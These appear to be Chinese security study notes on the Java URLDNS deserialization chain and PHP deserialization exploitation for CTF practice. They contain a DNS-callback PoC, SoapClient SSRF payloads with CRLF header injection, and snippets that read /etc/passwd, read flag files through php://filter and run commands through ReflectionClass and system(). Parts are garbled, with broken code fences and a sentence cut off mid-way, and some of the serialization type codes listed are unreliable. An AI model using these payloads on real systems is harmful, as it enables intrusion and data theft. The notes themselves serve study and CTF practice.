<h2 id="0x04hashCode"><a href="#0x04hashCode" class="headerlink" title="0x04hashCode()"></a>0x04hashCode()</h2><p>跟进<code>hashCode()</code>函数，由于在<code>ysoserial</code>中的<code>URLDNS</code>是利用<code>URL</code>对象，于是跟进<code>Java</code>基本类<code>URL</code>中关于<code>hashCode()</code>的部分<code>java/net/URL.java</code>，由于<code>hashCode</code>的值默认为<code>-1</code>，因此会执行<code>hashCode = handler.hashCode(this)</code>;</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (hashCode != -<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">return</span> hashCode;</span><br><span class="line"></span><br><span class="line">        hashCode = handler.hashCode(<span class="built_in">this</span>);</span><br><span class="line">        <span class="keyword">return</span> hashCode;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h2 id="0x05URLStreamHandler"><a href="#0x05URLStreamHandler" class="headerlink" title="0x05URLStreamHandler"></a>0x05URLStreamHandler</h2><p>调试跟进<code>java/net/URLStreamHandler.java</code>中的<code>hashCode()</code>函数，可以看到这里调用了一个函数<code>getHostAddress()</code>来进行<code>DNS</code>解析返回对应的<code>IP</code></p>
<img src="/2023/03/22/java%E5%8F%8D%E5%B0%84%E4%B8%8EURLDNS%E9%93%BE/image-20230322205310959.png" class="" title="image-20230322205310959">





<h1 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDemo</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Date</span> <span class="variable">nowTime</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashmap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://lttx9f.dnslog.cn&quot;</span>);</span><br><span class="line">        <span class="type">SimpleDateFormat</span> <span class="variable">simpleDateFormat</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleDateFormat</span>(<span class="string">&quot;yyyy-MM-dd hh:mm:ss&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">filed</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.net.URL&quot;</span>).getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        filed.setAccessible(<span class="literal">true</span>);  <span class="comment">// 绕过Java语言权限控制检查的权限</span></span><br><span class="line">        filed.set(url, <span class="number">209</span>);</span><br><span class="line">        hashmap.put(url, <span class="number">209</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;当前时间为: &quot;</span> + simpleDateFormat.format(nowTime));</span><br><span class="line">        filed.set(url, -<span class="number">1</span>); <span class="comment">//本地编译中不进行DNS解析</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./dnsser&quot;</span>);</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">            objectOutputStream.writeObject(hashmap);</span><br><span class="line">            objectOutputStream.close();</span><br><span class="line">            fileOutputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;./dnsser&quot;</span>);</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">            objectInputStream.readObject();</span><br><span class="line">            objectInputStream.close();</span><br><span class="line">            fileInputStream.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>











<p>参考：<a href="https://blog.csdn.net/a745233700/article/details/82893076">(140条消息) Java基础篇：反射机制详解_张维鹏的博客-CSDN博客</a></p>
<p><a href="https://www.freebuf.com/articles/web/327710.html">Java安全学习—URLDNS链 - FreeBuf网络安全行业门户</a></p>
<p><a href="https://songly.blog.csdn.net/article/details/118555444?spm=1001.2014.3001.5502">(119条消息) 2-java安全基础——动态类加载（反射）_反射动态加载类_songly_的博客-CSDN博客</a></p>
]]></content>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>php反序列化</title>
    <url>/2023/03/14/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<h1 id="php反序列化"><a href="#php反序列化" class="headerlink" title="php反序列化"></a>php反序列化</h1><h2 id="PHP反序列化漏洞详解"><a href="#PHP反序列化漏洞详解" class="headerlink" title="PHP反序列化漏洞详解"></a>PHP反序列化漏洞详解</h2><p>各访问修饰符序列化后的区别：<br>public：属性被序列化的时候属性名还是原来的属性名，没有任何改变<br>protected：属性被序列化的时候属性名会变成%00*%00属性名，长度跟随属性名长度而改变<br>private：属性被序列化的时候属性名会变成%00类名%00属性名，长度跟随属性名长度而改变</p>
<p>php版本7.0以上不敏感，可以不用修饰</p>
<p>这个表示方法是指在 PHP 中使用序列化函数 serialize() 或 unserialize() 进行对象或变量序列化与反序列化时，对不同类型的数据采用的标识符。</p>
<p>具体的表示方法如下：</p>
<ul>
<li>a - 数组型，如 array(1, 2, 3)。</li>
<li>b - 布尔型，如 true 或 false。</li>
<li>d - 浮点型，如 3.14。</li>
<li>i - 整数型，如 123。</li>
<li>o - 共同对象，如 StdClass 对象。</li>
<li>r - 对象引用，如对象的引用 ID。</li>
<li>s - 非转义的二进制字符串，如 “hello”。</li>
<li>S - 转义的二进制字符串，如 “hel\nlo”。</li>
<li>C - 自定义对象，如自定义类对象。</li>
<li>O - 类对象，如类对象。</li>
<li>N - 空，如 null。</li>
<li>R - 指针引用，如引用的指针地址。</li>
<li>U - Unicode 编码的字符串，如 “你好”。</li>
</ul>
<p>这些标识符的作用是将不同类型的数</p>
<ul>
<li>__construct() 当一个对象创建时被调用</li>
</ul>
<p>例如</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span> = <span class="string">&#x27;yesyes&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">&#125;&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Name</span>(<span class="string">&#x27;admin&#x27;</span>, <span class="number">100</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>__destruct() 当一个对象销毁前被调用</p>
</li>
<li><p>__sleep() 在对象被序列化前被调用</p>
</li>
<li><p>__wakeup 将在反序列化之后立即被调用</p>
<p><strong>当成员属性数目大于实际数目时可绕过wakeup方法(CVE-2016-7124)</strong></p>
</li>
<li><p>__toString 当一个对象被当做字符串使用时被调用</p>
<p><strong>：当一个对象被当作一个字符串被调用。我搜索到的它的作用主要就是能echo一个实例化的类（如果这个类没有toString()，则会报错），因为echo时会自动调用toString()</strong></p>
</li>
<li><p>__get(),__set() 当<strong>调用****或</strong>设置<strong>一个类及其父类方法中未定义的属性时</strong></p>
<p><em><em>调用</em>-get() $a&#x3D;$b;  $b未定义;             设置 -set()  $a&#x3D;$b;  $a未定义;</em>*</p>
</li>
<li><p><strong>—</strong>get() 用于从不可访问的属性读取数据**<br><strong>#难以访问包括：（1）私有属性，（2）没有初始化的属性</strong></p>
</li>
<li><p>__invoke() 调用函数的方式调用一个对象时的回应方法</p>
</li>
<li><p>__call 和 __callStatic前者是调用类不存在的方法时执行，而后者是调用类不存在的静态方式方法时执行。</p>
</li>
<li><p>&#96;&#96;&#96;php<br>__call($method,$args) $method 不存在的方法 $args参数 可数组表示</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">2.这两个魔术方法需要php7.4以上才能生效</span><br><span class="line"></span><br><span class="line">3.当__serialize和__sleep方法同时存在，序列化时忽略__sleep方法而执行__serialize；当__unserialize方法和__wakeup方法同时存在，反序列化时忽略__wakeup方法而执行__unserialize</span><br><span class="line"></span><br><span class="line">4.__unserialize的参数：当__serialize方法存在时，参数为__serialize的返回数组；当__serialize方法不存在时，参数为实例对象的所有属性值组合而成的数组</span><br><span class="line"></span><br><span class="line">```php</span><br><span class="line">__isset()，当对不可访问属性调用isset()或empty()时调用</span><br></pre></td></tr></table></figure></li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">__unset</span>()，当对不可访问属性调用<span class="keyword">unset</span>()时被调用。</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">__set_state</span>()，调用<span class="title function_ invoke__">var_export</span>()导出类时，此静态方法会被调用。</span><br><span class="line"><span class="title function_ invoke__">__clone</span>()，当对象复制完成时调用</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__autoload</span>()，尝试加载未定义的类</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__debugInfo</span>()，打印所需调试信息</span><br></pre></td></tr></table></figure>

<p>file_put_contents() 函数 <strong>用于把字符串写入文件</strong>，成功返回写入到文件内数据的字节数，失败则返回 FALSE。</p>
<p>file_put_contents()写文件。默认的是重新写文件，也就是会 替换原先的内容。追加的话使用参数FILE_APPEND</p>
<h2 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents()"></a>file_get_contents()</h2><p>file_get_contents() <strong>把整个文件读入一个字符串中。</strong></p>
<p>php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;xxx</p>
<p>如何显示flag.php的内容呢?直接包含是不会显示的，这时就要用到这个php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;取源代码并进行base64编码输出，不然会直接当做php代码执行就看不到源代码内容了。</p>
<p>php:&#x2F;&#x2F;filter在双off的情况下也可以正常使用；</p>
<p>allow_url_fopen：off&#x2F;on</p>
<p>allow_url_include：off&#x2F;on</p>
<p>base64解密得到原始数据：</p>
<p>这里就不细写了</p>
<h1 id="原生类"><a href="#原生类" class="headerlink" title="原生类"></a>原生类</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__wakeup() ``//执行unserialize()时，先会调用这个函数</span><br><span class="line">__sleep() ``//执行serialize()时，先会调用这个函数</span><br><span class="line">__destruct() ``//对象被销毁时触发</span><br><span class="line">__call() ``//在对象上下文中调用不可访问的方法时触发</span><br><span class="line">__callStatic() ``//在静态上下文中调用不可访问的方法时触发</span><br><span class="line">__get() ``//用于从不可访问的属性读取数据或者不存在这个键都会调用此方法</span><br><span class="line">__set() ``//用于将数据写入不可访问的属性</span><br><span class="line">__isset() ``//在不可访问的属性上调用isset()或empty()触发</span><br><span class="line">__unset() ``//在不可访问的属性上使用unset()时触发</span><br><span class="line">__toString() ``//把对象当作字符串使用时触发</span><br><span class="line">__invoke() ``//当尝试将对象调用为函数时触发</span><br></pre></td></tr></table></figure>

<p><strong>一些常见原生类的利用</strong></p>
<p><strong>可以结合伪协议使用</strong></p>
<h2 id="SoapClient-类"><a href="#SoapClient-类" class="headerlink" title="SoapClient 类"></a>SoapClient 类</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">SoapClient &#123;</span><br><span class="line">    <span class="comment">/* 方法 */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">__construct</span> ( <span class="keyword">string</span>|<span class="literal">null</span> <span class="variable">$wsdl</span> , <span class="keyword">array</span> <span class="variable">$options</span> = [] )</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">__call</span> ( <span class="keyword">string</span> <span class="variable">$name</span> , <span class="keyword">array</span> <span class="variable">$args</span> ) : <span class="keyword">mixed</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">__doRequest</span> ( <span class="keyword">string</span> <span class="variable">$request</span> , <span class="keyword">string</span> <span class="variable">$location</span> , <span class="keyword">string</span> <span class="variable">$action</span> , <span class="keyword">int</span> <span class="variable">$version</span> , <span class="keyword">bool</span> <span class="variable">$oneWay</span> = <span class="literal">false</span> ) : <span class="keyword">string</span>|<span class="literal">null</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">__getCookies</span> ( ) : <span class="keyword">array</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">__getFunctions</span> ( ) : <span class="keyword">array</span>|<span class="literal">null</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">__getLastRequest</span> ( ) : <span class="keyword">string</span>|<span class="literal">null</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">__getLastRequestHeaders</span> ( ) : <span class="keyword">string</span>|<span class="literal">null</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">__getLastResponse</span> ( ) : <span class="keyword">string</span>|<span class="literal">null</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">__getLastResponseHeaders</span> ( ) : <span class="keyword">string</span>|<span class="literal">null</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">__getTypes</span> ( ) : <span class="keyword">array</span>|<span class="literal">null</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">__setCookie</span> ( <span class="keyword">string</span> <span class="variable">$name</span> , <span class="keyword">string</span>|<span class="literal">null</span> <span class="variable">$value</span> = <span class="literal">null</span> ) : <span class="keyword">void</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">__setLocation</span> ( <span class="keyword">string</span> <span class="variable">$location</span> = <span class="string">&quot;&quot;</span> ) : <span class="keyword">string</span>|<span class="literal">null</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">__setSoapHeaders</span> ( SoapHeader|<span class="keyword">array</span>|<span class="literal">null</span> <span class="variable">$headers</span> = <span class="literal">null</span> ) : <span class="keyword">bool</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">__soapCall</span> ( <span class="keyword">string</span> <span class="variable">$name</span> , <span class="keyword">array</span> <span class="variable">$args</span> , <span class="keyword">array</span>|<span class="literal">null</span> <span class="variable">$options</span> = <span class="literal">null</span> , SoapHeader|<span class="keyword">array</span>|<span class="literal">null</span> <span class="variable">$inputHeaders</span> = <span class="literal">null</span> , <span class="keyword">array</span> &amp;<span class="variable">$outputHeaders</span> = <span class="literal">null</span> ) : <span class="keyword">mixed</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到，该内置类有一个 <code>__call</code> 方法，当 <code>__call</code> 方法被触发后，它可以发送 HTTP 和 HTTPS 请求。正是这个 <code>__call</code> 方法，使得 SoapClient 类可以被我们运用在 SSRF 中。SoapClient 这个类也算是目前被挖掘出来最好用的一个内置类。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$target</span> = <span class="string">&#x27;http://127.0.0.1&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>, <span class="string">&#x27;user_agent&#x27;</span> =&gt; <span class="string">&quot;WHOAMI\r\nCookie: PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4&quot;</span>, <span class="string">&#x27;uri&#x27;</span> =&gt; <span class="string">&#x27;test&#x27;</span>));</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$c</span>-&gt;<span class="title function_ invoke__">a</span>();    <span class="comment">// 随便调用对象中不存在的方法, 触发__call方法进行ssrf</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$target</span> = <span class="string">&#x27;http://47.xxx.xxx.72:2333/&#x27;</span>;</span><br><span class="line"><span class="variable">$post_data</span> = <span class="string">&#x27;data=whoami&#x27;</span>;</span><br><span class="line"><span class="variable">$headers</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;X-Forwarded-For: 127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie: PHPSESSID=3stu05dr969ogmprk28drnju93&#x27;</span></span><br><span class="line">);</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>,<span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&#x27;wupco^^Content-Type: application/x-www-form-urlencoded^^&#x27;</span>.<span class="title function_ invoke__">join</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="variable">$headers</span>).<span class="string">&#x27;^^Content-Length: &#x27;</span>. (<span class="keyword">string</span>)<span class="title function_ invoke__">strlen</span>(<span class="variable">$post_data</span>).<span class="string">&#x27;^^^^&#x27;</span>.<span class="variable">$post_data</span>,<span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&#x27;test&#x27;</span>));</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="string">&quot;\n\r&quot;</span>,<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$c</span>-&gt;<span class="title function_ invoke__">a</span>();    <span class="comment">// 随便调用对象中不存在的方法, 触发__call方法进行ssrf</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<h2 id="Error-x2F-Exception"><a href="#Error-x2F-Exception" class="headerlink" title="Error&#x2F;Exception"></a>Error&#x2F;Exception</h2><p><strong>Error</strong> 是所有PHP内部错误类的<a href="https://so.csdn.net/so/search?q=%E5%9F%BA%E7%B1%BB&spm=1001.2101.3001.7020">基类</a>。 (PHP 7, 8)</p>
<p>**Error::__toString ** error 的<a href="https://so.csdn.net/so/search?q=%E5%AD%97%E7%AC%A6%E4%B8%B2&spm=1001.2101.3001.7020">字符串</a>表达</p>
<p>返回 Error 的 string表达形式。</p>
<p><strong>Exception</strong>是所有用户级异常的基类。 (PHP 5, 7, 8)</p>
<p>**Exception::__toString ** 将异常对象转换为字符串</p>
<p>返回转换为字符串（string）类型的异常。</p>
<h2 id="DirectoryIterator-x2F-FilesystemIterator"><a href="#DirectoryIterator-x2F-FilesystemIterator" class="headerlink" title="DirectoryIterator&#x2F;FilesystemIterator"></a>DirectoryIterator&#x2F;FilesystemIterator</h2><p><strong>DirectoryIterator类</strong>提供了一个简单的接口来查看文件系统目录的内容。</p>
<p><strong>DirectoryIterator::__toString</strong> 获取字符串形式的文件名 （PHP 5,7,8）</p>
<p>目录遍历</p>
<p>使用此内置类的__toString方法结合glob或file协议，即可实现目录遍历</p>
<p><strong>FilesystemIterator</strong>继承于DirectoryIterator，两者作用和用法基本相同，区别为FilesystemIterator会显示文件的完整路径，而DirectoryIterator只显示文件名</p>
<p>DirectoryIterator:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);<span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;<span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&#x27;&lt;br&gt;&#x27;</span>);&#125;</span><br></pre></td></tr></table></figure>

<p>FilesystemIterator:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">FilesystemIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);<span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;<span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&#x27;&lt;br&gt;&#x27;</span>);&#125;</span><br></pre></td></tr></table></figure>

<p><strong><a href="https://www.php.net/manual/zh/class.globiterator.php">Globlterator</a></strong></p>
<p>(PHP 5 &gt;&#x3D; 5.3.0, PHP 7, PHP 8)</p>
<p>与前两个类的作用相似，GlobIterator 类也是可以遍历一个文件目录，使用方法与前两个类也基本相似。但与上面略不同的是其行为类似于 glob()，可以通过模式匹配来寻找文件路径。</p>
<p>既然遍历一个文件系统性为类似于glob()</p>
<p>所以在这个类中不需要配合glob伪协议，可以直接使用</p>
<img src="/2023/03/14/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/t01cf7107806fb6f656.png" class="" title="img">

<p><strong>1.2读取文件内容</strong></p>
<p><a href="https://www.php.net/manual/en/class.splfileinfo.php">SplFileInfo</a><br> (PHP 5 &gt;&#x3D; 5.1.2, PHP 7, PHP 8)</p>
<blockquote>
<p>SplFileInfo类为单个文件的信息提供了高级的面向对象接口<br>SplFileInfo::__toString — Returns the path to the file as a string &#x2F;&#x2F;将文件路径作为字符串返回</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(__file__);</span><br><span class="line"><span class="variable">$context</span> = <span class="keyword">new</span> <span class="built_in">SplFileObject</span>(<span class="string">&#x27;/etc/passwd&#x27;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$context</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span>(<span class="variable">$f</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a href="https://p0.ssl.qhimg.com/t0113810294b306ce19.png"><img src="/2023/03/14/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/t0113810294b306ce19.png" class="" title="img"></a></p>
</blockquote>
<p>echo new GlobIterator(&quot;&#x2F;f*&quot;);<br>读文件名<br>$N1-&gt;txw4ever &#x3D; “echo new SplFileObject(&quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;&#x2F;fllllllaaag&quot;);”;<br>读文件</p>
<h2 id="反射类ReflectionClass"><a href="#反射类ReflectionClass" class="headerlink" title="反射类ReflectionClass"></a>反射类ReflectionClass</h2><p>echo new ReflectionClass(类名)</p>
<p>ReflectionClass反射类在PHP5新加入，继承自Reflector，它可以与已定义的类建立映射关系，通过反射类可以对类操作<br>反射类不仅仅可以建立对类的映射，也可以建立对PHP基本方法的映射，并且返回基本方法执行的情况。因此可以通过建立反射类new ReflectionClass(system(‘cmd’))来执行命令</p>
<h2 id="ArrayObject"><a href="#ArrayObject" class="headerlink" title="ArrayObject"></a>ArrayObject</h2><p><code>ArrayObject</code> 是 PHP 内置的一个类，用于将数组对象化，提供了访问和操作数组的方法和属性。下面是一些 <code>ArrayObject</code> 的特性和使用方法：</p>
<ol>
<li>可以像数组一样访问和操作：<code>ArrayObject</code> 对象可以像数组一样通过下标访问和操作元素，如 <code>$arr[0] = &#39;apple&#39;</code>。</li>
<li>可以使用迭代器访问：<code>ArrayObject</code> 对象实现了 <code>Iterator</code> 接口，可以使用 <code>foreach</code> 循环遍历元素。</li>
<li>支持特殊数组方法：<code>ArrayObject</code> 还支持一些特殊的数组方法，如 <code>ksort()</code>、<code>asort()</code>、<code>uksort()</code>、<code>uasort()</code> 等，用于对数组进行排序和重排。</li>
<li>支持数组融合操作：<code>ArrayObject</code> 还支持 <code>ArrayObject</code> 对象之间的融合操作，可以使用 <code>ArrayObject::exchangeArray()</code> 方法将两个 <code>ArrayObject</code> 对象融合在一起。</li>
</ol>
<p>ArrayObject可以利用反序列化构造自定义对象</p>
<p>列：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ctfshow</span>=<span class="string">&#x27;cat /f*&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">new</span> <span class="built_in">ArrayObject</span>(<span class="keyword">array</span>(<span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">ctfshow</span>()));<span class="comment">//或者不仅array</span></span><br><span class="line"><span class="variable">$serialized</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$arr</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$serialized</span>;</span><br><span class="line"><span class="comment">//C:11:&quot;ArrayObject&quot;:71:&#123;x:i:0;a:1:&#123;i:0;O:7:&quot;ctfshow&quot;:1:&#123;s:7:&quot;ctfshow&quot;;s:7:&quot;cat /f*&quot;;&#125;&#125;;m:a:0:&#123;&#125;&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以对某些题型进行绕过</p>
<h1 id="phar反序列化"><a href="#phar反序列化" class="headerlink" title="phar反序列化"></a>phar反序列化</h1><h2 id="认识phar"><a href="#认识phar" class="headerlink" title="认识phar"></a><strong>认识phar</strong></h2><p>phar是什么?简单来说就是把php压缩而成的打包文件，无需解压，可以通过phar:&#x2F;&#x2F;协议直接读取内容 ，大多数PHP文件操作允许使用各种URL协议去访问文件路径：如<code>data://</code>，<code>zlib://</code>或<code>php://</code>。<code>phar://</code>也是流包装的一种，</p>
<p><code>phar</code>结构由 4 部分组成</p>
<ul>
<li><code>stub</code> phar 文件标识，格式为 <code>xxx&lt;?php xxx; __HALT_COMPILER();?&gt;；</code></li>
<li><code>manifest</code> 压缩文件的属性等信息，以<strong>序列化</strong>存储；</li>
<li><code>contents</code> 压缩文件的内容；</li>
<li><code>signature</code> 签名，放在文件末尾；</li>
</ul>
<p>注意：要将php.ini中的phar.readonly选项设置为Off，否则无法生成phar文件。</p>
<p>[Phar] </p>
<p>;phar.readonly &#x3D; On 首先在php.ini中修改phar.readonly这个选项，去掉前面的分号，并改值为off，由于安全原因该选项默认是on，如果在php.ini中是禁用的（值为0或off），那么在用户脚本中可以开启或关闭，如果在php.ini中是开启的，那么用户脚本是无法关闭的，所以这里设置为off来展示示例。</p>
<p>下面是php代码构造一个phar文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar1.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$O</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>(); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

